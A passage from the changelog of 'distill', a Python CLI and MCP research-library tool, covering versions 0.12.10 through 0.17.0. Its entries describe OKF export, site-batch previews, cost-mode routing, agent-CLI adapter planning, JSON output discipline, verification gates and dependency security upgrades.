- **Local metadata fallback.** When Ollama or LM Studio is unreachable,
  `LOCAL_FALLBACK_CONTEXT_WINDOW` (32,768) is used so chunking and multipass
  still plan honestly instead of assuming cloud-scale windows.

## 0.17.0 - 2026-06-20

The OKF interop milestone. Distill's Open Knowledge Format producer and
validator graduate from undocumented code to a documented, supported surface
ahead of the 1.0 contract freeze, paired with a read-only `site_batch` planning
path that lets loop runners inspect a plan before any mutation. The loop-ready
stewardship surface this milestone also covers - `distill audit --next-actions
--json` and `distill profile run` - shipped and was documented in earlier 0.16.x
releases.

### Added

- Documented `distill export <topic|all> --what bundle --format okf`: writes a
  read-only Open Knowledge Format v0.1 bundle under `output/okf-<topic>` (or
  `okf-all`), projecting each source Markdown file into an OKF concept document
  with `type`, `title`, `description`, `tags`, `timestamp`, `source_path`, an
  optional `resource` URL, and a `# Citations` section derived from source URLs
  and verify sidecars. Generated `index.md` and `log.md` make the bundle
  self-describing, and the native `library/` layout stays the source of truth.
  The export surface shipped in 0.16.4; this release documents it and commits to
  it as a supported contract.
- Documented `distill okf validate <path>`: checks OKF v0.1 structural
  conformance - every non-reserved Markdown file must carry parseable YAML
  frontmatter with a non-empty `type`, reserved `index.md`/`log.md` frontmatter
  must parse when present, and broken or bundle-escaping Markdown links surface
  as warnings rather than errors (the spec's permissive consumer model). Global
  `--json` emits the structured result and exits non-zero on an invalid bundle.
  Also shipped in 0.16.4 and documented here.
- Added `preview=true` to MCP `site_batch`, returning the resolved crawl plan
  without model checks, crawling, writes, or spend. This structural preview is
  allowed in `DISTILL_MCP_READ_ONLY=1` deployments so loop runners can inspect a
  plan before any mutation.
- Extended the MCP `site_batch` tool so relative JSON seed files use the same
  exact-page, shallow-crawl, crawl-prefix, and unsupported-mode handling as the
  CLI. Direct URL lists and TXT seed files remain exact-page by default.
- Added global `--json` support for `distill site-batch --preview`, returning
  the resolved exact-page and shallow-crawl plan in the standard JSON envelope
  without crawling, checking a model, or writing artifacts.

## 0.16.20 - 2026-06-20

### Added

- Added `distill site-batch --preview` plus explicit JSON seed modes for
  mixed website batches. Seed files can mark URL objects or collections as
  `exact-page` or `shallow-crawl`, and preview shows the resolved pages, depth,
  and crawl boundary before any model check, crawl, or write. Unsupported mode
  names fail during seed-file loading.

## 0.16.19 - 2026-06-20

### Added

- Added explicit website `crawl_prefix` boundaries for site seeds. Trusted-site
  section URLs now carry their source path into shallow discover crawls, direct
  `distill site` runs can pass `--crawl-prefix`, and JSON site batches can set
  `crawl_prefix` on URL objects or collections.

## 0.16.18 - 2026-06-20

### Changed

- Site ingest now returns structural result counts for analyzed pages and
  unchanged-page reuse, and discover, site-batch, and MCP site-batch surfaces
  report those skip outcomes in progress or JSON.

## 0.16.17 - 2026-06-20

### Added

- Added `distill discover --site-crawl-depth` and `--site-crawl-pages`, keeping
  website candidates exact-page by default while allowing explicit bounded
  shallow crawls for selected site seeds.

## 0.16.16 - 2026-06-20

### Changed

- Trusted-site discovery now prefers public same-host links found in
  landing-page TOC/navigation containers before generic landing links, and
  labels their preview source as `toc link`.

## 0.16.15 - 2026-06-20

### Changed

- Site candidates in `distill discover` now carry structural preview identity:
  exact URL, section label, discovery source, and sitemap freshness hint when
  available.

## 0.16.14 - 2026-06-20

### Added

- Added `distill discover --trusted-site`, which enumerates candidate website
  pages from operator-trusted domains or section URLs using public same-host
  sitemaps and landing-page links, then feeds those exact-page seeds into the
  existing goal-aware rerank.

## 0.16.13 - 2026-06-20

### Added

- Added video content stats to `distill discover` candidate output, showing
  full videos, Shorts, and known watch time before preview approval or ingest.

## 0.16.12 - 2026-06-20

### Added

- Added paper citation export with `distill export <topic|all> --what citations
  --format bibtex|ris`, using local paper artifacts and DOI metadata captured
  from arXiv when available.

## 0.16.11 - 2026-06-20

### Added

- Added a dedicated `distill audit` section for long videos whose transcript
  receipts are suspiciously short, using the same deterministic duration and
  character-count warning already surfaced in `distill health`.

## 0.16.10 - 2026-06-20

### Fixed

- Kept the `distill` logger at DEBUG while controlling console verbosity
  through handler levels, so `library/.distill/distill.log` captures DEBUG
  records even when console output remains warning-only. Reused CLI processes
  now add or retarget the file handler for the current library instead of
  keeping a stale log destination.

## 0.16.9 - 2026-06-20

### Added

- Added exact YouTube identity duplicate detection to `distill audit`, so the
  trust report flags video artifact directories that point at the same source
  video through `video_id` or normalized YouTube URLs.

## 0.16.8 - 2026-06-20

### Changed

- Made the CLI home dashboard render from the shared
  `dashboard_snapshot()` data source used by the web dashboard, leaving
  `distill.commands.dashboard` as presentation code.

## 0.16.7 - 2026-06-20

### Changed

- Deleted the remaining `distill.commands._logic` facade and moved its private
  compatibility exports into `distill._cli_impl`, leaving command
  implementations in focused owner modules.

## 0.16.6 - 2026-06-20

### Changed

- Moved the top-level CLI callback into `distill.commands.root`, moved the `concepts` Typer app construction into `distill.commands.concepts`, repointed remaining command modules and tests off `_logic.py`, and reduced `_logic.py` from 201 to 113 lines.

## 0.16.5 - 2026-06-20

### Changed

- Moved discover planning, sizing, display, and mixed-source ingest helper body into `distill.commands._discover_flow`, re-exported command-level helpers through `distill.commands.discover`, and reduced `_logic.py` from 470 to 201 lines.

## 0.16.4 - 2026-06-20

### Added

- Added `distill audit <topic|all> --next-actions --json`, a loop-readable action plan over deterministic audit findings with action ids, exact commands, approval class, write scope, loop metadata, and verifier stop conditions.
- Added fixture-backed tests for the audit next-action JSON contract, covering empty, orientation-only, and structural-finding action plans.
- Added the versioned recurring research profile parser and validator for `research-profile.v1` files, covering source declarations, freshness policy, output preferences, limits, and no-metered-cost profile invariants.
- Added checked-in recurring profile examples for `ai-developer-news`, `live-agentic-dev`, and `vendor-docs-watch`, each with a goal file and no-metered preview defaults.
- Added `distill profile preview <name|path>` with JSON output and a human table, resolving current feed items, YouTube channel updates, domain seeds, repository seeds, and saved query preview commands without ingesting or analyzing anything.
- Added the first `DISTILL_COST_MODE=auto|no-metered|paid-ok` foundation: config and router parsing, route classification, and fail-closed router refusal for API-billed or unknown routes in `no-metered`.
- Added global `distill --cost-mode <auto|no-metered|paid-ok>` overrides, with no-metered profile previews emitting replay commands that carry the override explicitly.
- Added `distill profile run <name|path>` with JSON output, approval-gated execution through generated `distill ...` commands, per-command exit capture, and resume state under `.distill/profiles/<profile>/run_state.json`.
- Added provider, route-class, and no-metered usage breakdowns to cost-log rows, including zero-dollar profile-run orchestration rows.
- Added structured no-metered route-block reports with provider, workload, cost class, proof requirements, and paid-ok retry guidance.
- Added profile-run `next_actions` rows with argv commands, approval class, write scope, verifier, and loop metadata for external runners.
- Added recurring profile health to `distill audit all`, covering invalid profiles, missing goals, stale or missing runs, failed commands, invalid state, and thin local corpora.
- Added `distill doctor --adapters` read-only CLI adapter preflights for candidate plan-quota and credit-metered routes.
- Added the strict `adapter-result.v1` manifest parser for future CLI adapters, covering usage signals, cost policy, auth class, declared files, and scratch path safety.
- Added local config auth-marker scanning to `distill doctor --adapters` so API-key config routes block no-metered claims without exposing secret values.
- Added scratch before/after write-check helpers for future CLI adapter runners, rejecting missing declared outputs and unexpected new scratch files.
- Added a scratch-only exact-argv adapter runner primitive with shell disabled, timeout handling, API-key environment stripping, manifest parsing, and scratch write checks.
- Added structured adapter support-statement details to `distill doctor --adapters`, including checked date, source URLs, required evidence, no-metered status, and notes.
- Added strict `quota_stop` metadata to the future `adapter-result.v1` manifest so quota and rate-limit stops cannot hide in free-text stop reasons.
- Added an adapter ledger helper that converts verified `adapter-result.v1` manifests into cost-tracker rows and metadata without making any adapter route live.
- Added the strict `adapter-workload.v1` package parser and exposed its contract through `distill doctor --adapters` JSON for future scratch-relative read-only adapter tasks.
- Added a checked adapter workload runner that loads `adapter-workload.v1`, runs exact argv arrays in scratch, and blocks result manifests that read, write, or report cost mode outside the package contract.
- Added a blocked Codex read-only command planner that records the future `codex exec --sandbox read-only` argv shape without making Codex eligible as a Distill route.
- Added a native adapter result writer that turns captured CLI output plus caller-supplied native usage into validated `adapter-result.v1` scratch manifests.
- Added command-plan capture metadata and a blocked Grok read-only command planner for future scratch adapter workloads.
- Added schema-path command-plan metadata and a blocked Claude read-only command planner for future scratch adapter workloads.
- Added deterministic Claude command-plan schema inlining from staged scratch JSON schema files.
- Added the strict `adapter-native-usage.v1` usage contract and wired the adapter result writer to consume validated native usage files from scratch.
- Added a strict Codex JSONL usage parser for `codex exec --json` `turn.completed` events.
- Added a Codex capture writer that turns captured JSONL stdout plus `result.txt` into `native-usage.json` and a validated `adapter-result.v1` scratch manifest.
- Added workload-runner capture hooks so tested adapter workloads can write captured results before manifest validation.
- Added a blocked Gemini CLI read-only command planner and tightened Gemini-family API-key blockers to include `GOOGLE_API_KEY`.
- Added a blocked Antigravity read-only command planner based on local `antigravity chat --help` evidence.
- Added a generic stdout capture writer for adapter CLIs that need captured stdout written to `result.txt` before manifest validation.
- Added a Claude JSON usage parser and capture writer that turn captured Claude Code JSON stdout into `native-usage.json`, `result.txt`, and a validated `adapter-result.v1` scratch manifest.
- Added staged stdin support to the scratch adapter runner and workload runner so future CLI adapter templates can receive prompt files without shell piping.
- Added read-only JSON auth-command probes for adapter doctor, including Claude auth status and Grok inspect markers without exposing secret values.
- Added a biggest-prompts view to `distill costs`, `distill costs --json`, and the local web costs page using per-call telemetry from `library/.distill/telemetry.jsonl`.
- Added context-engineering contribution rules to `docs/CONTRIBUTING.md` so prompt, MCP, report, pipeline, and loop changes preserve provenance, keep default context small, and measure prompt-budget impact.
- Added shared batch progress formatting and wired it into `distill papers` and `distill site-batch`, showing phase, item count, completed count, failed count, running spend, and ETA when enough items have completed.
- Added persistent per-video progress output for video-backed loops such as `distill latest` and `distill catch-up`, showing completed count, failed count, running spend, and ETA after each processed video.
- Added the same per-item progress surface to `distill discover` paper and site ingestion, while its video branch uses the shared video progress path.
- Added report progress for the default 4-phase pipeline, covering report phases, section writing, and QA rewrites with completed count, failed count, running spend, and ETA when available.
- Added global `distill --quiet/-q` and `distill --verbose/-v` output controls, with `--quiet` suppressing human console output for loop runners and `--verbose` enabling debug logging.
- Added `--help` examples for recurring workflow preview, approval, ingest, audit next-action plans, OKF export, and OKF validation.

### Changed

- Moved discover paper and site ingest loop bodies into `distill.commands._discover_ingest`, preserving the existing `_logic` wrappers and lowering the `_logic.py` module-size ratchet from 1512 to 1444 lines.
- Moved global output-mode setup into `distill.commands._helpers`, keeping `_logic.py` under its lowered module-size ratchet.
- Moved watch-owned display helpers into `distill.commands.watch`, repointed the goal-refresh test, preserved the `distill.cli._format_date` compatibility export from `cli_shared`, and lowered the `_logic.py` module-size ratchet from 1444 to 1355 lines.
- Moved site-ingest helpers into `distill.commands._site_ingest`, repointed CLI and MCP callers plus tests, preserved `distill.cli` compatibility re-exports, and lowered the `_logic.py` module-size ratchet from 1355 to 1077 lines.
- Moved paper artifact writing into `distill.commands._paper_artifacts`, repointed CLI, MCP, discover, and verify tests, removed dead scaffold comments, brought `_logic.py` below the 1000-line cap at 981 lines, and removed the module-size allowlist entry.
- Moved the post-ingest concept playbook helper into `distill.commands._concept_ingest`, repointed paper, learn, and discover callers plus tests, and reduced `_logic.py` from 981 to 949 lines.
- Moved installed package version lookup into `distill._version`, repointed dashboard, doctor, maintain, and tests to the canonical helper, and reduced `_logic.py` from 949 to 936 lines.
- Moved channel-list display truncation into `distill.commands._helpers`, repointed dashboard tests to the canonical helper, and reduced `_logic.py` from 936 to 919 lines.
- Moved shared video helper wrappers to direct `distill.commands._helpers` aliases, repointed process, watch, discover, and learning tests to the canonical owner, and reduced `_logic.py` from 919 to 838 lines.
- Moved learning query expansion and video selection into `distill.commands._learning`, repointed learning and CLI wiring tests to the canonical helper, and reduced `_logic.py` from 838 to 704 lines.
- Moved learning-flow injection wrappers into `distill.commands._learning`, repointed learn, discover, topic, topic-watch, and CLI wiring tests to the canonical helper, and reduced `_logic.py` from 704 to 470 lines.
- Corrected the default report method label from 3-phase to 4-phase.
- Documented Substack-class newsletter feeds as trusted recurring research profile sources, with page capture still available through `distill site` and durable refresh handled by feed ingestion.
- Documented the external runner contract for loop handoffs: Distill emits state, argv commands, write scopes, approval class, and verifiers, while Codex, Claude Code, Grok Build, cron, GitHub Actions, or a human owns scheduling and execution.
- Clarified the agentic-balance boundary for recurring profile preview: deterministic code owns fetch, parse, identity, freshness, limits, and cost refusal, while models own source fit, novelty, rumor classification, and priority.
- Clarified local and plan-quota route policy: local Ollama/LM Studio still analyzes freshly fetched receipts, plan-quota CLIs remain adapter-gated external workers, and Copilot-style AI-credit CLIs are credit-metered unless a future support statement proves otherwise.
- Documented the current no-metered behavior: local Ollama and LM Studio routes are allowed by topology, xAI/Gemini/API routes are blocked, and unproven adapter routes such as `agent` stay blocked until adapter doctor, current structured support statement, included-plan auth proof, adapter-specific workload wiring, native usage ledgering, and eval proof exist.

### Fixed

- Raised the `pydantic-settings` runtime lower bound and the dev `msgpack` lower bound to fixed versions so dependency audit passes cleanly.
- Fixed recurring profile path resolution so `missing.yaml` resolves to `profiles/missing.yaml`, not `profiles/missing.yaml.yaml`, and explicit missing `.yaml` or `.yml` paths stay explicit.
- Fixed `distill site-batch` seed handling so one unexpected seed-level exception records a `site-ingest` run issue and the remaining seeds continue. `BudgetExceededError` still stops the run.

## 0.16.3 - 2026-06-17

### Changed

- Moved the `distill topic-watch` sub-app from `_logic.py` into `distill/commands/topic_watch.py`, repointed `discover.monitor --now`, and lowered the `_logic.py` module-size ratchet from 2,612 to 2,210 lines. No behavior change intended.
- Moved the `distill topic` sub-app from `_logic.py` into `distill/commands/topic.py`, including its profile, workflow, summary, and corpus-bundle helpers. Repointed report/export bundle imports and topic command tests, and lowered the `_logic.py` module-size ratchet from 2,210 to 1,616 lines. No behavior change intended.
- Moved shared verify, lens, completion, and source-rigor helpers from `_logic.py` into `distill/commands/_helpers.py` and `distill/commands/_learning.py`. Repointed command imports/tests and lowered the `_logic.py` module-size ratchet from 1,616 to 1,512 lines. No behavior change intended.

## 0.16.2 - 2026-06-16

**Dependency security bump.** `pip-audit` flagged eight CVEs disclosed against pinned dependencies after the 0.16.1 build. Targeted lockfile upgrade to the fix versions; no product code changed, so behavior is identical to 0.16.1.

### Security

- **cryptography 48.0.0 -> 49.0.0** (GHSA-537c-gmf6-5ccf).
- **pypdf 6.12.2 -> 6.13.2** (CVE-2026-54530, CVE-2026-54531). Direct dependency; the open `>=4.0.0` bound already gave fresh installs the patched version, this pins the dev/CI floor to match.
- **python-multipart 0.0.29 -> 0.0.32** (CVE-2026-53538, CVE-2026-53539, CVE-2026-53540).
- **starlette 1.2.0 -> 1.3.1** (CVE-2026-54282, CVE-2026-54283).
- Verified: `pip-audit` clean, ruff (clean) + format, full suite green (2,317 passed).

## 0.16.1 - 2026-06-14

First PyPI build carrying the 0.13-0.16 line: 0.13.0 through 0.16.0 each shipped a `release:` commit but were never tagged, so the tag-triggered publish workflow never ran and PyPI/the release page stayed at 0.12.13. This release tags a green-CI commit so `pip install distillr` is current again; it cumulatively includes every 0.13-0.16 feature plus the internal refactors below.

### Changed

- **`_logic.py` decomposition - Phase 2 progress (pure relocations, no behavior change).** Continued retiring the monolith one green slice at a time, each lowering the must-only-decrease module-size ratchet:
  - Home screen + HTML dashboard renderers (`_show_dashboard`, `_show_first_run_home`, `_build_start_here_table`, `_dashboard_metric`, `_dashboard_snapshot`, `_render_dashboard_html`) → **`distill/commands/dashboard.py`**. `_logic`'s root callback lazy-imports `_show_dashboard` to avoid the import cycle; `maintain.py`/`cli.py` repointed. The home-screen test fixtures now patch `dashboard.get_config` (verified load-bearing - the no-arg-`distill` tests pass *because* of the patch, the stale-patch false-green guard).
  - Topic-watch naming/ranking helpers (`_topic_watch_name`, `_normalize_topic_watch_ranking_mode`, `_topic_watch_ranking_strategy`) → **`distill/commands/_topic_watch.py`** support module (zero back-references); `dashboard.py`/`discover.py` import from the foundation instead of back from `_logic`.
  - `_detect_ramp_source` (pure structural dispatch) → **`distill/commands/_helpers.py`**; `discover.py` repointed.
  - Net across these three slices: `_logic.py` 3,304 → 2,612 lines (9,373 at the start of the effort). Two command groups remain in the monolith (`topic_app`, `topic_watch_app`) plus the root callback and the shared helper body. Status and per-slice plan: [`docs/design/logic-decomposition.md`](design/logic-decomposition.md).
  - Verified each slice: ruff (clean) + format, import-linter (4/4 kept), pyright (0 errors), bandit (0 medium+), full suite green (2,244 passed).

## 0.16.0 - 2026-06-13

**Golden-corpus eval gate (blocking) -- a 1.0 quality-bar item.** The test-time complement to the run-time verify hook: verify grounds *production* output against receipts; this freezes what *good* extraction looks like and proves the scorer can still tell good from bad. Catches the regression class coverage/types/lint miss -- prompt drift, scoring changes, and silent degradation of section/concept extraction.

### Added

- **`distill/eval/golden.py`**: a hand-checked golden analysis for every one of the nine eval fixtures (paper/video/site), each carrying the workload's expected sections, every golden concept, and production artifact shape (headings + bullets, full depth).
- **`tests/unit/eval/test_golden_gate.py`** (runs in the already-blocking suite, fully offline): every golden scores at/above a measured per-dimension floor (composite >= 0.90, structure/concept-coverage/formatting == 1.0, depth >= 0.75); a deliberately degraded output scores far below it (so a gate that rubber-stamps everything is itself caught); and the real per-workload prompt builders run under a mock LLM so a prompt-builder signature break surfaces in CI, not production. Freezes two contracts at once -- the scoring logic and the fixtures (golden drift forces a lockstep, reviewed update).

Follow-up (noted, not in this release): a golden for the concept-playbook pipeline (which concepts cross threshold, which polarities), and the metamorphic-robustness pass on the same fixtures.

- Verified: ruff (clean) + format (clean), import-linter (4/4 kept), pyright on `distill/llm/` (0 errors), bandit (0 medium+), full suite green (2253 passed) at 81.11% branch coverage.

## 0.15.0 - 2026-06-13

**Install/update QOL: `distill update` + an update-available nudge.** Modern CLI tools upgrade in place and tell you when they're stale; distill now does both.

### Added

- **`distill update`** (`distill/update.py`, `distill/commands/update.py`): upgrades distillr in place, detecting the install method - **uv tool**, **pipx**, or **pip** - and running the matching upgrade (`uv tool upgrade` / `pipx upgrade` / `pip install --upgrade`). A **source/editable checkout** is detected precisely (via `direct_url.json`) and never auto-upgraded - it prints `git pull` + `uv sync` guidance instead. `distill update --check` reports installed-vs-latest without upgrading; `--json` parity on both. Subprocess runs with the same hardened cwd/env as the yt-dlp updater (no `PYTHONPATH`/`PYTHONHOME` injection).
- **Update-available nudge on startup**: a one-line notice when a newer distillr is published, checked against PyPI at most once per day (cached in `.distill/.update_check.json`), non-blocking, failure-silent (offline = no notice), opt-out via `DISTILL_NO_UPDATE_CHECK=1`. Rides the existing `_preflight` cadence alongside the yt-dlp staleness check. PEP 440 version comparison via `packaging`.
- Install scripts and README/usage document `distill update` as the upgrade path; both installers print it in their next-steps.

### Fixed (harden pass over the 0.13.1-0.14.0 surface)

Two independent adversarial reviews of the synthesis-verify and console/`--json` changes confirmed no correctness defects; two LOW stdout-discipline gaps were closed so the `--json` stdout-purity invariant holds across *every* command, not just the read surface:

- The one-time `cost_log.jsonl` migration notice in `save_run_log` printed to **stdout** (bare `print`) - it could land in a `--json` generation command's envelope stream once per library. Now routed through `err_console` (stderr).
- The `concepts` command emitted its `--json` payload via a bespoke `typer.echo(JsonEnvelope...)`; unified onto the shared `emit_json` helper.

- Verified: ruff (clean) + format (clean), import-linter (4/4 kept), pyright on `distill/llm/` + the new modules (0 errors), bandit (0 medium+), full suite green (2230 passed) at 80.99% branch coverage.

## 0.14.0 - 2026-06-12

**Agent-grade `--json` and stdout discipline.** The two P0 items from the CLI audit: a clean machine-readable read surface and a strict stdout/stderr split, so an agent can loop distill and parse it reliably.

### Added

- **One shared console (`distill/_console.py`).** Every module - commands, pipeline, ingestors, concepts, library - now prints through a single `Console` object instead of ~27 independent ones. Foundational module (no upward imports), so the consolidation respects the layering contracts.
- **`--json` redirects all human output to stderr.** With one shared console, `--json` flips it to stderr (via Rich's dynamic `stderr` flag, so no captured-stream pinning) and commands write their JSON envelope straight to stdout. Result: stdout carries *exactly one* JSON object and always parses, while progress/diagnostics/errors still surface on stderr - the documented contract, now actually true. Resets per invocation so a reused process (test runner, MCP server) never leaks the redirect.
- **`--json` on the read surface.** `library`, `videos`, `show` (insights/transcript/metadata), `synthesis`, and `findings` now emit structured envelopes instead of nothing (`costs`/`doctor`/`health`/`alerts` already did). Shared `emit_json` / `json_mode_active` helpers in `distill/commands/_json.py`. `--json` is **read-only**: querying a not-yet-generated synthesis returns `{"found": false}` rather than triggering a paid generation, so an agent can't cause spend by inspecting.

### Changed

- `docs/usage.md` JSON section rewritten to match the now-accurate behavior (stderr split, read-only, the covered command list).

- Verified: ruff (clean) + format (clean), import-linter (4/4 kept), pyright on `distill/llm/` (0 errors), bandit (0 medium+), full suite green (2216 passed) at 81% branch coverage.

## 0.13.2 - 2026-06-12

**CLI agent-readiness pass.** Audited the CLI surface against current (June 2026) CLI-first best practices (clig.dev, Anthropic's agent-tool guidance, the uv-tool distribution shift) and closed the cheap, high-signal gaps for an agent-/loop-driven tool. (Larger items -- full `--json` coverage across the read surface and a dedicated stderr diagnostics stream -- are scoped as a follow-up.)

### Added

- **`distill --version` / `-V`** -- eager flag that prints the installed version and exits 0, before any config load (the one convention every agent and bug report starts from).
- **No-TTY-safe prompts.** New `tty_confirm` / `tty_prompt` helpers back every interactive confirmation and menu (channel removal, directory rename, discover sizing + ingest, eval run, audit action menu, concept rollback): when stdin is not a terminal they resolve to the safe default instead of aborting on EOF, so a loop or agent shell never hangs or crashes on a prompt. Bare `distill` skips the screen-clear when stdout is piped.
- **Top-level exit-code mapping.** `main()` now routes caught provider errors through the documented taxonomy (3=config/bad key, 4=network/timeout) instead of always exiting 1, so callers can branch on the cause.
- **uv-first distribution.** README leads with `uv tool install distillr` (and `uvx --from distillr distill` to try it); both install scripts prefer `uv` when present and fall back to pipx. Shell-completion (`--install-completion`) and a "no telemetry" statement are now documented; the duplicated corpus-location paragraph in the README was removed.

### Changed

- `docs/usage.md` JSON section corrected to list the commands that actually support `--json` today and to state that diagnostics are suppressed (not yet redirected to stderr) under `--json`; added Version, unattended-operation, and shell-completion sections.

- Verified: ruff (clean) + format (clean), import-linter (4/4 kept), pyright on `distill/llm/` (0 errors), bandit (0 medium+), full suite green with branch coverage above the 80% floor.

## 0.13.1 - 2026-06-12

**Verify on every synthesis emit -- the second 0.10 item closed.** 0.13.0 gated the cross-paper synthesis; this extends the same write-time grounding to the remaining synthesis writers so no synthesis artifact reaches the corpus unchecked. The receipt is always the synthesis's own inputs (the prompt's evidence), the artifact most prone to attribution swaps.

### Added

- **Verify gate on channel, topic, corpus (single- and two-pass), site, and site-topic synthesis emits.** Each grounds the generated synthesis against the exact text the prompt was built from -- per-video insights (channel), channel syntheses (topic), per-source sections (corpus single-pass), the rendered claim set (corpus two-pass), per-page insights (site), site syntheses (site-topic). Both verify tiers apply; `--verify strict` refuses the write and keeps any previous synthesis in place. Sidecars carry distinct identities (`<topic>-paper-synthesis`, `<topic>-corpus-synthesis`, `<topic>-topic-synthesis`, and `<topic>_<sub>` for per-channel/per-site) so the topic-level syntheses can't collide.
- **A two-pass strict refusal no longer falls back to single-pass.** `synthesize_corpus_from_claims` now returns `None` on refusal (distinct from `""` = no claims); the caller surfaces it as `""` instead of spending again on a single-pass synthesis over the same flagged corpus.
- **`distill audit` counts synthesis sidecars separately.** The verify rollup sweeps each topic's synthesis artifacts by their writer-stamped sidecar identity and reports synthesis coverage (total / verified clean / never checked) apart from insight coverage; flagged synthesis claims join the shared findings list. Pre-0.13 syntheses show as never-checked and re-check on regeneration.
- Shared `run_synthesis_verify` helper in `distill/pipeline/verify.py` so every synthesis writer runs an identical verify-and-refuse tail (the spend-records-before-the-gate ordering is preserved so a strict refusal never leaves a call off-ledger).

- Verified: ruff (clean) + format (clean), import-linter (4/4 kept), pyright on `distill/llm/` and the changed modules (0 errors), bandit (0 medium+), full suite green (2201 passed) at 81% branch coverage.

## 0.13.0 - 2026-06-12

**The entailment tier -- prose claims checked locally.** The last substantive 0.10 item: the deterministic tier's named limitation classes (derived arithmetic, context-blind support, prose claims with no checkable tokens) get their checker. Design in [`docs/design/entailment-tier.md`](design/entailment-tier.md), settled by the claim-verification dogfood corpus's own promoted answer.

### Added

- **`distill/pipeline/verify_entailment.py`**: deterministic claim extraction (the bullet/sentence is the unit -- decomposition measurably improves matching), ~1,500-char evidence windows with overlap, top-K lexical pairing (no embeddings, per the no-database invariant), and an `EntailmentChecker` protocol scored claim-by-claim -- max over chunks, flag below threshold (`DISTILL_ENTAILMENT_THRESHOLD`, default 0.5). A flag means "support not found", not "false", same contract as the numeric tier. Per the invariants this is a classifier, not an LLM-as-judge-of-record.
- **HHEM-2.1-Open as the default checker** behind the new optional extra: `pip install distillr[entailment]` (transformers + torch; ~110M params, Apache 2.0, CPU-feasible, CUDA-accelerated where available). Absent extra = tier silently skipped, deterministic tier stands alone exactly as before; `distill doctor` gains a Verification section showing both tiers' status. The checker loads once per process and a checker crash can never kill an ingest run.
- **Sidecar schema v2 (additive)**: `_Verify.json` gains an `entailment` block (checked/supported/flagged with claim, score, best-chunk preview, model, threshold); v1 sidecars stay valid. `--verify strict` now refuses a write on prose flags too; the audit's verify rollup counts entailment flags as findings (`kind: "entailment"`).
- **Verify on synthesis emits (first path)**: the cross-paper synthesis -- the artifact most prone to attribution swaps -- is now verified against its own inputs (the per-paper insights) before writing, with a distinct sidecar identity (`<topic>-paper-synthesis`); strict mode refuses the write and keeps the previous synthesis. Corpus/topic synthesis paths follow in 0.13.1 (their receipts assemble differently).

- Verified: ruff (clean) + format (clean), import-linter (4/4 kept), pyright on `distill/llm/` (0 errors), bandit (0 medium+), full suite green with branch coverage above the 80% floor. All tier logic tested with a mock checker -- CI installs no model; live HHEM validation on the dev box follows as the model download completes.

## 0.12.13 - 2026-06-12

**Harden pass over the 0.12.7-0.12.12 surface** (the codified rhythm: a bug-hunt release after a run of feature releases). Two independent adversarial reviews over everything this series added; every claim verified against the code before acting -- two reported HIGHs were false alarms on verification (the freshness identity convention matches what the writers stamp; the captionless-to-ladder flow is by design), and the real defect class was fixed everywhere it appeared.

### Fixed

- **The spend cap could be swallowed inside MCP tool bodies.** Per-item `except Exception` loops and `contextlib.suppress(Exception)` blocks in six MCP tools (`papers`, `resynthesize_topic`, `generate_report`, `synthesize`, `site_batch`, `catch_up`, `discover`/`learn_topic` synthesis tails) caught `BudgetExceededError` and kept going -- and since each model call spends before recording, a capped run kept burning money item after item. Every such site now re-raises the budget abort so the `write_tool` decorator's structured `budget_exceeded` response is reachable and spend actually stops at the cap. Pinned by a test proving a capped `papers` call stops at the first budget hit.
- **`goals.json` writes are now atomic** -- a crash mid-write previously left a corrupt file whose recovery path silently dropped every persisted goal.
- **Printed goal-refresh commands quote paths containing whitespace** so the surfaced line is copy-paste correct.

- Verified: ruff (clean) + format (clean), import-linter (4/4 kept), pyright on `distill/llm/` (0 errors), bandit (0 medium+), full suite green with branch coverage above the 80% floor.

## 0.12.12 - 2026-06-12

**The library-level hygiene rollup -- the dev-library review's last build item.** Every per-topic view treated all 53 dev-library topics as equals; 11 were unlabeled validation leftovers, 7 were empty, one was a broken reparse point -- invisible until the review.

### Added

- **`distill audit all` ends with the library-wide view**: a `Library_Audit.md` artifact at the library root plus a one-line console rollup. Objective findings: empty topic directories (listed as safe to delete -- nothing distill wrote lives there), unreadable directories (broken links/reparse points), and topics with sources but no orientation files (invisible to agents; the regen command is printed). Names suggesting test/validation topics are listed *informationally*, explicitly not findings -- a deliberate experiment is not wrong, just worth sweeping when it stops earning its place.
- Validated live on the dev library, free: 46 healthy / 7 empty / 0 unindexed / 11 test-named -- matching the panel review that motivated the feature.

- Verified: ruff (clean) + format (clean), import-linter (4/4 kept), pyright on `distill/llm/` (0 errors), bandit (0 medium+), full suite green with branch coverage above the 80% floor.

## 0.12.11 - 2026-06-12

**YouTube-path resilience -- the 0.11 margin closed.** The flagship source's transcript path was one yt-dlp attempt with a blanket except, then a legacy external fallback; under YouTube's PO-token/SABR churn that degraded quietly.

### Added

- **Caption retry with backoff**: transient failures (network, HTTP 429/5xx, extractor churn) retry up to twice with backoff; the transient/permanent split is structural -- an exception is retryable, a clean download that lands no `.vtt` file means the video is captionless and a retry cannot change that. yt-dlp itself gets `retries` + `socket_timeout`.
- **Local-first Whisper ladder for captionless videos**: bestaudio download (size-capped) then the same `transcribe_media` routing every other audio source uses (faster-whisper local -> Grok STT -> OpenAI Whisper), with a vocabulary hint from the video's own title and uploader -- closing the proper-noun mistranscription class for YouTube too. Cloud STT spend records to the run tracker; local is $0. The legacy scribe fallback is demoted to last resort.

- Verified: ruff (clean) + format (clean), import-linter (4/4 kept), pyright on `distill/llm/` (0 errors), bandit (0 medium+), full suite green with branch coverage above the 80% floor.

## 0.12.10 - 2026-06-12

**Per-item failure isolation -- the last named 0.12 margin.** Long mixed-source runs already printed `[i/N]` per-item progress; the missing half was that one crashed source killed everything after it. The dogfood library carried the scar: a topic with five papers newer than its last synthesis, from a run that died mid-loop.

### Added

- **One failed source no longer kills the run**: the paper loops (discover + `distill papers`), the site-seed loop, and the per-video channel sweep each isolate per-item failures -- a structured run issue is recorded (`paper-analysis` / `site-ingest` / `video-analysis` stage, exception type preserved), the loop continues, and synthesis still covers everything that landed.
- **The resume hint**: when a run ends with retryable per-item failures, the summary prints "Re-run the same command to retry the failed source(s) -- already-ingested sources are skipped" -- true because ingest re-runs are convergent (0.9.27), so re-run *is* the resume mechanism; no checkpoint file needed.
- **The spend cap stays a hard stop**: `BudgetExceededError` re-raises through every per-item catch -- swallowing it as a per-item issue would defeat the 0.12.9 MCP per-call budget.

- Verified: ruff (clean) + format (clean), import-linter (4/4 kept), pyright on `distill/llm/` (0 errors), bandit (0 medium+), full suite green with branch coverage above the 80% floor.

## 0.12.9 - 2026-06-12

